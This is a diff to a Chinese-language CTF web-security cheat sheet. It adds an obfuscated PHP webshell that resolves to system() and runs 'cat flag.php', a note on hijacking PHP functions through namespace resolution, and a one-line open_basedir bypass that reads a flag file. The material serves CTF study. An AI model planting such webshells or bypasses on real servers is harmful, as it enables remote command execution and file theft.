@@ -204,6 +204,12 @@ $___($_[_]);// assert($_POST[_]);
 
 A=fl;B=ag;cat $A$B
 
+
+// math函数webshell 8
+<?php
+$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){1}(($$pi){2})&1=system&2=cat%20flag.php
+?>
+
 ```
 
 ## webshell 内存驻留
@@ -617,6 +623,13 @@ Request: `http://rs.panja.cc/test.php?url=%67%67`
 - Example
     - Code-Breaking Puzzles - pcrewaf
 
+## 利用命名空间特性劫持函数
+
+- 调用函数时，PHP会在当前命名空间递归向下搜索该函数
+    - a/b/c 命名空间下调用f，会搜索 a/b/c/f -> a/b/f -> a/f -> builtins/f
+- 最先搜索到的函数会优先加载
+- 基于此特性，可以打一个monkey patch来劫持底层函数
+
 
 ## 其他
 
@@ -917,7 +930,7 @@ pop graphic-context
     - SHA1()
     - COMPRESS() / UNCOMPRESS()
     - group_concat()
-        - 合併多条结果
+        - 合并多条结果
             - e.g. `select group_concat(username) from users;` 一次返回所有使用者名
     - greatest()
         - `greatest(a, b)`返回a, b中最大的
@@ -1537,6 +1550,12 @@ HQL injection example (pwn2win 2017)
     - `<!--#include file="../../web.config"-->`
 - Example
     - HITCON CTF 2018 - Why so Serials?
+
+## PHP open_basedir bypass
+
+```
+chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));
+```
 
 # 上传漏洞
 
